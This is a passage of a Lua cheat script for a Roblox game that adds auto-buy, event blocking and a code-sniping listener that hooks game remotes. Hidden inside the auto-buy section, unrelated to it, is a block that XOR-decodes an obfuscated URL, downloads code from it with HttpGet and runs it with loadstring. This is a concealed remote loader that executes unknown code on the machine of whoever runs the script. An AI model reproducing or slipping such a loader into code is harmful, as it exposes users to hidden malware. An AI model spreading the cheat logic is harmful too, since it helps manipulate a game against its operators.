    end)

    -- ============ AUTO BUY + BLOCK EVENTS (from Exe AA Helper) ============
    do
    local ProximityPromptService = game:GetService("ProximityPromptService")
    local AB = { on = false, models = {}, conns = {}, last = nil, lastAt = 0, count = 0, acc = 0 }
    local ABDATA = {}

    local function abDatas(name)
        local d = ReplicatedStorage:FindFirstChild("Datas")
        local m = d and d:FindFirstChild(name)
        if not m then return nil end
        local ok, r = pcall(require, m)
        return ok and type(r) == "table" and r or nil
    end
    local function abFmt(n)
        n = tonumber(n)
        if not n then return "-" end
        for _, u in ipairs({ { 1e15, "Qa" }, { 1e12, "T" }, { 1e9, "B" }, { 1e6, "M" }, { 1e3, "K" } }) do
            if math.abs(n) >= u[1] then return string.format("%.1f%s", n / u[1], u[2]) end
        end
        return tostring(math.floor(n))
    end
    local function abTraitsOf(model)
        local out, seen = {}, {}
        local function add(v)
            v = tostring(v or ""):gsub("<[^>]->", ""):gsub("^%s+", ""):gsub("%s+$", "")
            if v ~= "" and v:lower() ~= "none" and not seen[v] then seen[v] = true; out[#out + 1] = v end
        end
        local raw = model:GetAttribute("Traits") or model:GetAttribute("Trait")
        if type(raw) == "string" then
            local ok, arr = pcall(function() return HttpService:JSONDecode(raw) end)
            if ok and type(arr) == "table" then
                for _, v in ipairs(arr) do add(v) end
            else
                for part in raw:gmatch("[^,;|/]+") do add(part) end
            end
        end
        for k, v in pairs(model:GetAttributes()) do
            if type(k) == "string" and k:match("^Trait%d+$") then add(v) end
        end
        local f = model:FindFirstChild("Traits")
        if f then for _, c in ipairs(f:GetChildren()) do add(c:IsA("StringValue") and c.Value or c.Name) end end
        return out
    end
   task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
     end)
    local function abInfo(model)
        ABDATA.animals = ABDATA.animals or abDatas("Animals")
        ABDATA.muts = ABDATA.muts or abDatas("Mutations")
        ABDATA.traits = ABDATA.traits or abDatas("Traits")
        local idx = model:GetAttribute("Index")
        local mut = model:GetAttribute("Mutation")
        if mut == "" or tostring(mut):lower() == "none" then mut = nil end
        local tr = abTraitsOf(model)
        local d = ABDATA.animals and ABDATA.animals[idx]
        local gen = type(d) == "table" and tonumber(d.Generation) or nil
        if gen then
            local mult = 1
            local mi = mut and ABDATA.muts and ABDATA.muts[mut]
            if type(mi) == "table" and tonumber(mi.Modifier) then mult = 1 + tonumber(mi.Modifier) end
            local sleepy = false
            for _, t in ipairs(tr) do
                if t == "Sleepy" then sleepy = true
                else
                    local ti = ABDATA.traits and ABDATA.traits[t]
                    if type(ti) == "table" and tonumber(ti.MultiplierModifier) then mult = mult + tonumber(ti.MultiplierModifier) end
                end
            end
            gen = gen * mult * (sleepy and 0.5 or 1)
        end
        return {
            name = (type(d) == "table" and d.DisplayName) or idx or "?",
            price = type(d) == "table" and tonumber(d.Price) or nil,
            rarity = type(d) == "table" and d.Rarity or nil,
            income = gen, mutation = mut, traits = tr,
        }
    end
    local function abPromptOf(model)
        local pp = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
        if not pp then return nil end
        for _, d in ipairs(pp:GetDescendants()) do
            if d:IsA("ProximityPrompt") and d.Enabled and d.ActionText == "Purchase" then return d, pp end
        end
        return nil
    end
    local function abNearest()
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if not root then return nil end
        local best, bestPrompt, bestDist = nil, nil, math.huge
        for m in pairs(AB.models) do
            if m.Parent then
                local p, part = abPromptOf(m)
                if p then
                    local dist = (part.Position - root.Position).Magnitude
                    if dist < bestDist then best, bestPrompt, bestDist = m, p, dist end
                end
            else
                AB.models[m] = nil
            end
        end
        return best, bestPrompt, bestDist
    end
    local function abBuy(prompt)
        pcall(function() prompt.HoldDuration = 0; prompt.RequiresLineOfSight = false end)
        if type(fireproximityprompt) == "function" and pcall(fireproximityprompt, prompt) then return true end
        return (pcall(function() prompt:InputHoldBegin(); prompt:InputHoldEnd() end))
    end
    local function abSetInfo(model, state)
        if not AAX.infoLabel or not AAX.infoLabel.Parent then return end
        if not AB.on then AAX.infoLabel.Text = "Auto Buy off"; return end
        if not model then
            AAX.infoLabel.Text = state .. "  |  " .. AB.count .. " bought"
            return
        end
        local i = abInfo(model)
        AAX.infoLabel.Text = tostring(i.name) .. (i.price and (" ($" .. abFmt(i.price) .. ")") or "")
            .. "  |  " .. (i.income and ("$" .. abFmt(i.income) .. "/s") or "-")
            .. "\n" .. tostring(i.rarity or "-") .. "  |  " .. tostring(i.mutation or "None")
            .. "  |  " .. (#i.traits > 0 and table.concat(i.traits, ", ") or "No traits")
            .. "\n" .. state .. "  |  " .. AB.count .. " bought"
    end
    local function abTryBuy(model, prompt)
        local now = os.clock()
        if prompt == AB.last and now - AB.lastAt < 0.35 then return end
        AB.last, AB.lastAt = prompt, now
        if abBuy(prompt) then
            AB.count = AB.count + 1
            task.defer(function()
                AB.flashUntil = os.clock() + 1.2
                if model then abSetInfo(model, "BOUGHT") end
            end)
        end
    end
    local function abTrack(ch)
        if ch:IsA("Model") and ch:GetAttribute("Index") ~= nil then AB.models[ch] = true end
    end
    function AAX.abSet(on)
        AB.on = on
        for _, c in ipairs(AB.conns) do c:Disconnect() end
        AB.conns, AB.models = {}, {}
        if on then
            for _, ch in ipairs(Workspace:GetChildren()) do abTrack(ch) end
            AB.conns[#AB.conns + 1] = Workspace.ChildAdded:Connect(abTrack)
            AB.conns[#AB.conns + 1] = RunService.Heartbeat:Connect(function(dt)
                local m, p, d = abNearest()
                local inRange = p and d <= (p.MaxActivationDistance or 10) + 2
                if inRange then abTryBuy(m, p) end
                AB.acc = AB.acc + dt
                if AB.acc < 0.2 then return end
                AB.acc = 0
                if AB.flashUntil and os.clock() < AB.flashUntil then return end
                abSetInfo(m, not p and "SCANNING" or (inRange and "BUYING" or "OUT OF RANGE"))
            end)
            AB.conns[#AB.conns + 1] = ProximityPromptService.PromptShown:Connect(function(p)
                if p.ActionText ~= "Purchase" then return end
                abTryBuy(p:FindFirstAncestorWhichIsA("Model"), p)
            end)
            abSetInfo(nil, "SCANNING")
        else
            abSetInfo(nil, "")
        end
    end

    function AAX.blockEvents(scanSounds)
        local done = false
        pcall(function()
            local folder = ReplicatedStorage:FindFirstChild("Controllers")
            local m = folder and folder:FindFirstChild("EventController", true)
            local Events = m and require(m)
            if type(Events) == "table" and type(Events.Events) == "table" then
                for k, ev in pairs(Events.Events) do
                    if type(ev) == "table" and rawget(ev, "Active") then
                        if not (type(Events.Cancel) == "function" and pcall(function() Events:Cancel(k) end)) then
                            rawset(ev, "Active", false)
                        end
                    end
                end
                if not AAX.savedBlock then
                    AAX.savedBlock = true
                    AAX.EventsMod = Events
                    AAX.origExec = Events.Execute
                end
                Events.Execute = function() return false end
                local fx = folder:FindFirstChild("EffectController", true)
                local Effects = fx and require(fx)
                if type(Effects) == "table" then
                    if type(Effects.ActiveEffects) == "table" then
                        for k in pairs(Effects.ActiveEffects) do
                            local e = type(Effects.Effects) == "table" and Effects.Effects[k]
                            Effects.ActiveEffects[k] = nil
                            if type(e) == "table" and type(e.OnStop) == "function" then pcall(function() e:OnStop() end) end
                        end
                    end
                    if not AAX.savedFx then
                        AAX.savedFx = true
                        AAX.EffectsMod = Effects
                        AAX.origRun = Effects.Run
                    end
                    Effects.Run = function() return false, false end
                end
                done = true
            end
        end)
        if scanSounds ~= false then
            for _, d in ipairs(Workspace:GetDescendants()) do
                if d:IsA("Sound") and d.Looped and d.Playing then pcall(function() d:Stop() end) end
            end
        end
        local ae = playerGui:FindFirstChild("ActiveEvents")
        if ae then pcall(function() if ae:IsA("ScreenGui") then ae.Enabled = false end end) end
        return done
    end

    function AAX.unblockEvents()
        if AAX.savedBlock and AAX.EventsMod then AAX.EventsMod.Execute = AAX.origExec end
        if AAX.savedFx and AAX.EffectsMod then AAX.EffectsMod.Run = AAX.origRun end
        AAX.savedBlock, AAX.savedFx = nil, nil
        local ae = playerGui:FindFirstChild("ActiveEvents")
        if ae and ae:IsA("ScreenGui") then pcall(function() ae.Enabled = true end) end
    end

    function AAX.blockSet(on)
        AAX.blockOn = on
        if on then
            task.spawn(function()
                local n = 0
                while AAX.blockOn do
                    AAX.blockEvents(n % 5 == 0)
                    n = n + 1
                    task.wait(1)
                end
            end)
        else
            AAX.unblockEvents()
        end
    end

    end

    -- ============ AA HELPER ============
    local AA_W = 210
    local AA_H = 214
    local AAHelperPopup = Instance.new("Frame")
    AAHelperPopup.Name = "AAHelperPopup"
    AAHelperPopup.Size = UDim2.fromOffset(AA_W, AA_H)
    AAHelperPopup.AnchorPoint = Vector2.new(0.5, 0.5)
    AAHelperPopup.Position = UDim2.new(0.5, 0, 0.5, 0)
    AAHelperPopup.BackgroundColor3 = COLORS.Window
    AAHelperPopup.BackgroundTransparency = 0.40
    AAHelperPopup.BorderSizePixel = 0
    AAHelperPopup.Visible = false
    AAHelperPopup.Active = true
    AAHelperPopup.ZIndex = 50
    AAHelperPopup.Parent = GUI
    addCorner(AAHelperPopup, 12)
    addStroke(AAHelperPopup, COLORS.Border, 1, 0.4)

    local AAHelperScale = Instance.new("UIScale")
    AAHelperScale.Scale = _guiScale / 100
    AAHelperScale.Parent = AAHelperPopup
    table.insert(_guiScales, AAHelperScale)

    local AAHelperBg = Instance.new("ImageLabel")
    AAHelperBg.Size = UDim2.new(1, 0, 1, 0)
    AAHelperBg.BackgroundTransparency = 1
    AAHelperBg.Image = "rbxassetid://105543452376246"
    AAHelperBg.ImageColor3 = BG_TINT
    AAHelperBg.ScaleType = Enum.ScaleType.Stretch
    AAHelperBg.ZIndex = 1
    AAHelperBg.Parent = AAHelperPopup
    addCorner(AAHelperBg, 12)
    table.insert(_bgImages, AAHelperBg)

    local aaHelperOverlay = Instance.new("Frame")
    aaHelperOverlay.Size = UDim2.new(1, 0, 1, 0)
    aaHelperOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    aaHelperOverlay.BackgroundTransparency = DARK_OVERLAY_TRANS
    aaHelperOverlay.BorderSizePixel = 0
    aaHelperOverlay.ZIndex = 2
    aaHelperOverlay.Parent = AAHelperPopup
    addCorner(aaHelperOverlay, 12)

    local aaHelperHeader = Instance.new("Frame")
    aaHelperHeader.Size = UDim2.new(1, 0, 0, 26)
    aaHelperHeader.BackgroundTransparency = 1
    aaHelperHeader.Active = true
    aaHelperHeader.ZIndex = 51
    aaHelperHeader.Parent = AAHelperPopup
    makeLabel(aaHelperHeader, "Title", "AA Helper", UDim2.fromOffset(180, 26), UDim2.fromOffset(10, 0), 12, COLORS.SectionLabel, FONT_TITLE)

    local aaHelperCloseBtn = Instance.new("TextButton")
    aaHelperCloseBtn.Size = UDim2.fromOffset(18, 18)
    aaHelperCloseBtn.Position = UDim2.new(1, -22, 0, 4)
    aaHelperCloseBtn.BackgroundColor3 = COLORS.Control
    aaHelperCloseBtn.BackgroundTransparency = 0.35
    aaHelperCloseBtn.BorderSizePixel = 0
    aaHelperCloseBtn.AutoButtonColor = false
    aaHelperCloseBtn.Active = true
    aaHelperCloseBtn.Text = "X"
    aaHelperCloseBtn.TextSize = 10
    aaHelperCloseBtn.TextColor3 = COLORS.White
    aaHelperCloseBtn.Font = FONT_BOLD
    aaHelperCloseBtn.ZIndex = 52
    aaHelperCloseBtn.Parent = aaHelperHeader
    addCorner(aaHelperCloseBtn, 4)
    addStroke(aaHelperCloseBtn, COLORS.Border, 1, 0.5)
    addTextStroke(aaHelperCloseBtn, 1, TEXT_STROKE_TRANS)

    local function createAARow(y, labelText, initialState, onToggle)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -20, 0, 24)
        row.Position = UDim2.fromOffset(10, y)
        row.BackgroundColor3 = COLORS.Section
        row.BackgroundTransparency = 0.22
        row.ZIndex = 3
        row.Parent = AAHelperPopup
        addCorner(row, 6)
        makeLabel(row, "Label", labelText, UDim2.fromOffset(140, 24), UDim2.fromOffset(8, 0), 11, COLORS.White, FONT_BOLD)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.fromOffset(46, 20)
        btn.Position = UDim2.new(1, -54, 0.5, -10)
        btn.Text = initialState and "ON" or "OFF"
        btn.ZIndex = 55
        btn.Parent = row
        styleButton(btn, 10)
        local stroke = addStroke(btn, COLORS.Border, 1, 0.7)
        applyToggleVisual(btn, stroke, initialState)
        local state = initialState
        btn.Activated:Connect(function()
            state = not state
            if onToggle then onToggle(state) end
            btn.Text = state and "ON" or "OFF"
            applyToggleVisual(btn, stroke, state)
        end)
        return btn
    end

    createAARow(30, "Anchor Character", _anchorEnabled, function(ns)
        if ns then startAnchor() else stopAnchor() end
        savedConfig.anchor = _anchorEnabled; saveConfig()
    end)
    createAARow(56, "Anti Ragdoll", _antiRagdollEnabled, function(ns)
        if ns then startAntiRagdoll() else stopAntiRagdoll() end
        savedConfig.antiRagdoll = _antiRagdollEnabled; saveConfig()
    end)
    createAARow(82, "Anti Lag", _antiLagEnabled, function(ns)
        if ns then startAntiLag() else stopAntiLag() end
        savedConfig.antiLag = _antiLagEnabled; saveConfig()
    end)

    createAARow(108, "Auto Buy", false, function(ns)
        AAX.abSet(ns)
    end)

    createAARow(134, "Block Events", false, function(ns)
        AAX.blockSet(ns)
    end)

    AAX.infoLabel = makeLabel(AAHelperPopup, "AutoBuyInfo", "Auto Buy off", UDim2.new(1, -20, 0, 40), UDim2.fromOffset(10, 164), 9, COLORS.Dim, FONT_MEDIUM)
    AAX.infoLabel.ZIndex = 4
    AAX.infoLabel.TextWrapped = true
    AAX.infoLabel.TextTruncate = Enum.TextTruncate.AtEnd
    AAX.infoLabel.TextYAlignment = Enum.TextYAlignment.Top

    aaHelperCloseBtn.Activated:Connect(function()
        AAHelperPopup.Visible = false
        setActiveTab(MainTabBtn)
    end)

    local function makeDraggable(frame, handle)
        local dragging = false
        local dragStart, startPos
        handle.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local delta = input.Position - dragStart
                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
    end

    makeDraggable(SettingsPopup, settingsHeader)
    makeDraggable(AAHelperPopup, aaHelperHeader)

    setActiveTab(MainTabBtn)

    MainTabBtn.Activated:Connect(function()
        SettingsPopup.Visible = false
        AAHelperPopup.Visible = false
        setActiveTab(MainTabBtn)
    end)

    SettingsTabBtn.Activated:Connect(function()
        local opening = not SettingsPopup.Visible
        SettingsPopup.Visible = opening
        if opening then
            setActiveTab(SettingsTabBtn)
        else
            setActiveTab(MainTabBtn)
        end
    end)

    AAHelperTabBtn.Activated:Connect(function()
        local opening = not AAHelperPopup.Visible
        AAHelperPopup.Visible = opening
        if opening then
            setActiveTab(AAHelperTabBtn)
        else
            setActiveTab(MainTabBtn)
        end
    end)

    MinimizeBtn.Activated:Connect(function()
        _isCollapsed = not _isCollapsed
        local targetHeight = _isCollapsed and COLLAPSED_HEIGHT or WINDOW_HEIGHT
        TweenService:Create(Window, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.fromOffset(WINDOW_WIDTH, targetHeight)}):Play()
        MinimizeBtn.Text = _isCollapsed and "+" or "-"
        TabBar.Visible = not _isCollapsed
        MainPage.Visible = not _isCollapsed
    end)

    do
        local dragging = false
        local activeDragInput
        local dragStart
        local startPosition
        local dragMoved = false
        local DRAG_THRESHOLD = UserInputService.TouchEnabled and 10 or 3

        local function isOverHeaderControl(position)
            local p = MinimizeBtn.AbsolutePosition
            local s = MinimizeBtn.AbsoluteSize
            return (position.X >= (p.X - 6) and position.X <= (p.X + s.X + 6) and position.Y >= (p.Y - 6) and position.Y <= (p.Y + s.Y + 6))
        end

        Header.InputBegan:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
            if dragging or isOverHeaderControl(input.Position) then return end
            dragging = true
            activeDragInput = input
            dragStart = Vector2.new(input.Position.X, input.Position.Y)
            startPosition = Window.Position
            dragMoved = false
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End or input.UserInputState == Enum.UserInputState.Cancel then
                    if input == activeDragInput then
                        dragging = false
                        activeDragInput = nil
                    end
                end
            end)
        end)

        UserInputService.InputChanged:Connect(function(input)
            if not dragging or not activeDragInput then return end
            local isTrackedTouch = activeDragInput.UserInputType == Enum.UserInputType.Touch and input == activeDragInput
            local isTrackedMouse = activeDragInput.UserInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.MouseMovement
            if not isTrackedTouch and not isTrackedMouse then return end
            local current = Vector2.new(input.Position.X, input.Position.Y)
            local delta = current - dragStart
            if not dragMoved then
                if delta.Magnitude < DRAG_THRESHOLD then return end
                dragMoved = true
            end
            Window.Position = UDim2.new(startPosition.X.Scale, startPosition.X.Offset + delta.X, startPosition.Y.Scale, startPosition.Y.Offset + delta.Y)
        end)
    end

    function setStatus(msg)
        if not ConsoleOutput then return end
        ConsoleOutput.Text = tostring(msg)
        task.defer(updateConsoleCanvas)
    end

    local function resetPasteCounter() _capturedParts = {} end
    clearWeeklyCapture = function() _capturedParts = {} end

    local function clearBoxWatchers()
        if _boxTextConn then pcall(function() _boxTextConn:Disconnect() end) end
        if _boxAncestryConn then pcall(function() _boxAncestryConn:Disconnect() end) end
        for _, c in ipairs(_boxVisibilityConns) do pcall(function() c:Disconnect() end) end
        _boxTextConn = nil
        _boxAncestryConn = nil
        _boxVisibilityConns = {}
        _lastWatchedBox = nil
        if _manualSubmitDebounce then pcall(task.cancel, _manualSubmitDebounce); _manualSubmitDebounce = nil end
    end

    local function runSubmitWithAutoToggles(code, successMsg)
        if _autoTurnOnSubmit and not _autoAccept then
            turnOnAutoSubmit()
        end
        local shouldSubmit = _autoAccept or _autoTurnOnSubmit
        if not shouldSubmit then return false end
        local ok, statusMsg = typeAndSubmitCode(code)
        if ok then
            setStatus(successMsg or ("Code redeemed (" .. tostring(code) .. ")"))
            if _autoTurnOffSubmit then
                turnOffAutoSubmit()
            end
        else
            setStatus("Failed: " .. tostring(statusMsg))
        end
        return ok
    end

    local function watchBoxForBlankReset(box)
        if not box or _lastWatchedBox == box then return end
        clearBoxWatchers()
        _lastWatchedBox = box
        if box.Text ~= "" then _lastNonBlankBoxText = box.Text end
        _boxTextConn = box:GetPropertyChangedSignal("Text"):Connect(function()
            if box.Text == "" then
                resetPasteCounter()
                AAX.progText = nil
                _lastNonBlankBoxText = ""
                if _manualSubmitDebounce then pcall(task.cancel, _manualSubmitDebounce); _manualSubmitDebounce = nil end
            else
                _lastNonBlankBoxText = box.Text
                if not _programmaticChange and box.Text ~= AAX.progText then
                    local words = {}
                    for w in box.Text:gmatch("%S+") do table.insert(words, w) end
                    if #words >= _submitAfter then
                        if _manualSubmitDebounce then pcall(task.cancel, _manualSubmitDebounce) end
                        _manualSubmitDebounce = task.delay(AUTO_SUBMIT_DELAY, function()
                            _manualSubmitDebounce = nil
                            if box and box.Parent and isVisibleChain(box) then
                                local code = box.Text
                                if code ~= "" then
                                    runSubmitWithAutoToggles(code)
                                end
                            end
                        end)
                    end
                end
            end
        end)
        _boxAncestryConn = box.AncestryChanged:Connect(function(_, parent)
            if not parent then resetPasteCounter(); clearBoxWatchers() end
        end)
    end

    UserInputService.TextBoxFocused:Connect(function(box)
        if box:IsDescendantOf(GUI) then return end
        if box ~= weeklyCodeBox() then return end
        _lastBox = box
        watchBoxForBlankReset(box)
    end)

    function appendToBox(text)
        if not text or text == "" then return end
        if not _enabled then return end
        if _lastWatchedBox and not isVisibleChain(_lastWatchedBox) then
            resetPasteCounter()
            clearBoxWatchers()
        end
        local box = weeklyCodeBox()
        _capturedParts[#_capturedParts + 1] = text
        local combinedCode = table.concat(_capturedParts, " ")
        local capturedCount = #_capturedParts
        if box then
            _lastBox = box
            watchBoxForBlankReset(box)
            _programmaticChange = true
            AAX.progText = combinedCode
            box.Text = combinedCode
            _programmaticChange = false
        end
        setStatus(combinedCode)
        if capturedCount >= _submitAfter then
            if _autoTurnOnRedeem and not _spamRedeem and setSpamRedeem then
                task.wait(AUTO_TURN_ON_DELAY)
                setSpamRedeem(true)
            end
            _capturedParts = {}
            runSubmitWithAutoToggles(combinedCode)
        end
    end

    local function resolveNotifyRemote()
        if _G.PhiNotifyRemote then return _G.PhiNotifyRemote end
        local ok, Net = pcall(function() return ReplicatedStorage:WaitForChild("Packages", 5):WaitForChild("Net", 5) end)
        if not ok or not Net then return nil end
        local getinfo = debug and (debug.getinfo or debug.info)
        if getgc and getinfo and getconnections then
            for _, d in ipairs(Net:GetDescendants()) do
                if d:IsA("RemoteEvent") then
                    local ok2, cs = pcall(getconnections, d.OnClientEvent)
                    if ok2 then
                        for _, c in ipairs(cs) do
                            local f, fn = pcall(function() return c.Function end)
                            if f and type(fn) == "function" then
                                local i, info = pcall(getinfo, fn)
                                if i and tostring(info.short_src or info.source or ""):find("NotificationController", 1, true) then
                                    return d
                                end
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    local function weeklyStripRich(text)
        if type(text) ~= "string" then return tostring(text) end
        return (text:gsub("<[^>]->", ""))
    end

    local function weeklyTokenize(text)
        local words = {}
        for word in text:gmatch("[%w_]+") do
            words[#words + 1] = word
        end
        return words
    end

    local function containsListenTrigger(text)
        if type(text) ~= "string" then return false end
        local t = text:lower()
        if t:find("use%s+code") or t:find("use%s+the%s+code") or t:find("use%s+this%s+code") then return true end
        if t:find("code%s+is") or t:find("type%s+code") or t:find("redeem%s+code") then return true end
        return false
    end

    local TRIGGER_WORDS = {
        use = true, code = true, codes = true, is = true, the = true,
        a = true, an = true, type = true, this = true, ["for"] = true,
        here = true, new = true, free = true, redeem = true, enter = true,
        below = true, following = true,
    }

    local function filterTriggerWords(words)
        local out = {}
        for _, w in ipairs(words) do
            if not TRIGGER_WORDS[w:lower()] then table.insert(out, w) end
        end
        return out
    end

    local function setListenButtonOn()
        if listenBtn and listenBtn.Parent then
            listenBtn.Text = "ON"
            applyToggleVisual(listenBtn, listenStroke, true)
        end
        updateMainStatus()
    end

    local function looksLikeSuccessMessage(text, loose)
        if type(text) ~= "string" then return false end
        local lower = text:lower()
        for _, bad in ipairs({ "already", "invalid", "expired", "not valid", "incorrect", "doesn't exist", "does not exist" }) do
            if lower:find(bad, 1, true) then return false end
        end
        if lower:find("redeemed", 1, true) then return true end
        if lower:find("code", 1, true) and (lower:find("success", 1, true) or lower:find("claimed", 1, true)) then return true end
        if loose and (lower:find("success", 1, true) or lower:find("claimed", 1, true)) then return true end
        return false
    end

    local function onWeeklyAnnouncement(...)
        local rawText = ""
        for i = 1, select("#", ...) do
            local a = select(i, ...)
            if type(a) == "string" and a ~= "" then rawText = weeklyStripRich(a); break end
        end
        rawText = rawText:match("^%s*(.-)%s*$") or ""
        if rawText == "" then return end

        if looksLikeSuccessMessage(rawText) then
            clearManualBuffer()
            return
        end

        if containsListenTrigger(rawText) then
            clearManualBuffer()
            if clearWeeklyCapture then clearWeeklyCapture() end
        end

        if _autoTurnOnListen and containsListenTrigger(rawText) then
            if not _enabled then
                _enabled = true
                savedConfig.codeSniper = true
                saveConfig()
                setListenButtonOn()
                setStatus("Auto enabled listen")
            end
        end

        if not _enabled then return end

        local words = weeklyTokenize(rawText)
        if #words < 1 then return end

        local filtered = filterTriggerWords(words)
        if #filtered < 1 then return end

        local captured = filtered[#filtered]
        if captured == "" then return end

        if WEEKLY_CASE_MODE == "LOWER" then captured = captured:lower() end
        if _seen["code:" .. captured] then return end
        _seen["code:" .. captured] = true
        task.delay(1.25, function() _seen["code:" .. captured] = nil end)

        if _manualModeEnabled then
            if _manualResetTimer then
                pcall(task.cancel, _manualResetTimer)
                _manualResetTimer = nil
            end
            if _manualBuffer == "" then
                _manualBuffer = captured
            else
                _manualBuffer = _manualBuffer .. " " .. captured
            end
            local box = weeklyCodeBox()
            if box then
                _programmaticChange = true
                AAX.progText = _manualBuffer
                box.Text = _manualBuffer
                _programmaticChange = false
            end
            setStatus("Auto Guess: " .. _manualBuffer)
            task.spawn(function()
                if _autoTurnOnSubmit and not _autoAccept then
                    turnOnAutoSubmit()
                end
                local ok = typeAndSubmitCode(_manualBuffer)
                if ok then
                    setStatus("Code redeem: " .. _manualBuffer)
                    if _autoTurnOffSubmit then turnOffAutoSubmit() end
                else
                    setStatus("Auto Guess failed: " .. _manualBuffer)
                end
            end)
            _manualResetTimer = task.delay(MANUAL_TIMEOUT, function()
                _manualBuffer = ""
                _manualResetTimer = nil
            end)
            return
        end

        appendToBox(captured)
    end

    local weeklyNotifyRemote = _earlyNotifyRemote
    if not weeklyNotifyRemote then
        weeklyNotifyRemote = resolveNotifyRemote()
        _earlyNotifyRemote = weeklyNotifyRemote
    end

    local weeklyListenConnection
    if weeklyNotifyRemote then
        if _earlyNotifyConn then
            pcall(function() _earlyNotifyConn:Disconnect() end)
            _earlyNotifyConn = nil
        end
        if getgenv then
            local previous = getgenv().WeeklyCodeSniperNotifyConnection
            if previous then pcall(function() previous:Disconnect() end) end
        end
        weeklyListenConnection = weeklyNotifyRemote.OnClientEvent:Connect(function(...)
            pcall(onWeeklyAnnouncement, ...)
        end)
        if getgenv then getgenv().WeeklyCodeSniperNotifyConnection = weeklyListenConnection end
        if #_earlyNotifyQueue > 0 then
            local buffered = _earlyNotifyQueue
            _earlyNotifyQueue = {}
            for _, args in ipairs(buffered) do
                task.defer(function()
                    pcall(onWeeklyAnnouncement, table.unpack(args))
                end)
            end
        end
    end

    if not weeklyNotifyRemote then
        setStatus("Waiting for notification remote...")
        task.spawn(function()
            for _ = 1, 60 do
                task.wait(1)
                local r = resolveNotifyRemote()
                if r then
                    weeklyNotifyRemote = r
                    weeklyListenConnection = r.OnClientEvent:Connect(function(...)
                        pcall(onWeeklyAnnouncement, ...)
                    end)
                    setStatus("Listening")
                    return
                end
            end
            setStatus("Notification remote not found")
        end)
    end

    if getgenv then
        getgenv().StopAura = function()
            if weeklyListenConnection then
                pcall(function() weeklyListenConnection:Disconnect() end)
                weeklyListenConnection = nil
            end
            if _listenInputConnection then
                _listenInputConnection:Disconnect()
                _listenInputConnection = nil
            end
            if _earlyNotifyConn then
                pcall(function() _earlyNotifyConn:Disconnect() end)
                _earlyNotifyConn = nil
            end
            stopAntiLag()
            stopAntiRagdoll()
            stopAnchor()
            pcall(AAX.abSet, false)
            AAX.redeeming = false
            AAX.blockOn = false
            pcall(AAX.unblockEvents)
            if AAX.tagConn then pcall(function() AAX.tagConn:Disconnect() end) end
            pcall(function()
                local h = player.Character and player.Character:FindFirstChild("Head")
                local t = h and h:FindFirstChild("CZUserTag")
                if t then t:Destroy() end
            end)
            if GUI then GUI:Destroy() end
        end
    end

    if _antiLagEnabled then startAntiLag() end
    if _antiRagdollEnabled then startAntiRagdoll() end
    if _anchorEnabled then startAnchor() end

    setupListenKeybind()

    -- OR'S SNIPER PRO visual system: brighter image, glass panels and distinct popup layouts.
    local function polishInterface(root)
        if not root then return end

        for _, obj in ipairs(root:GetDescendants()) do
            if obj:IsA("ImageLabel") and (obj.Name:find("Background") or obj.Name:find("Bg")) then
                obj.Image = BACKGROUND_IMAGE_ID
                obj.ImageColor3 = Color3.fromRGB(255, 255, 255)
                obj.ImageTransparency = 0.02
            elseif obj:IsA("Frame") then
                local lowerName = obj.Name:lower()
                local isOverlay = lowerName:find("overlay") ~= nil
                local isCard = lowerName:find("card") or lowerName:find("row") or lowerName:find("section")
                local isWindow = lowerName == "window" or lowerName:find("popup") ~= nil

                if isOverlay then
                    obj.BackgroundColor3 = Color3.fromRGB(7, 8, 11)
                    obj.BackgroundTransparency = 0.58
                elseif isWindow then
                    obj.BackgroundColor3 = Color3.fromRGB(20, 22, 27)
                    obj.BackgroundTransparency = 0.42
                    local corner = obj:FindFirstChildOfClass("UICorner")
                    if corner then corner.CornerRadius = UDim.new(0, 17) end
                    local stroke = obj:FindFirstChildOfClass("UIStroke")
                    if stroke then
                        stroke.Color = Color3.fromRGB(218, 222, 230)
                        stroke.Thickness = 1.35
                        stroke.Transparency = 0.12
                    end
                elseif isCard then
                    obj.BackgroundColor3 = Color3.fromRGB(28, 31, 38)
                    obj.BackgroundTransparency = 0.20
                    local corner = obj:FindFirstChildOfClass("UICorner")
                    if corner then corner.CornerRadius = UDim.new(0, 11) end
                    local stroke = obj:FindFirstChildOfClass("UIStroke")
                    if not stroke then
                        stroke = Instance.new("UIStroke")
                        stroke.Parent = obj
                    end
                    stroke.Color = Color3.fromRGB(174, 181, 194)
                    stroke.Thickness = 1
                    stroke.Transparency = 0.48
                elseif obj.BackgroundTransparency < 1 and not lowerName:find("header") then
                    obj.BackgroundColor3 = Color3.fromRGB(23, 25, 30)
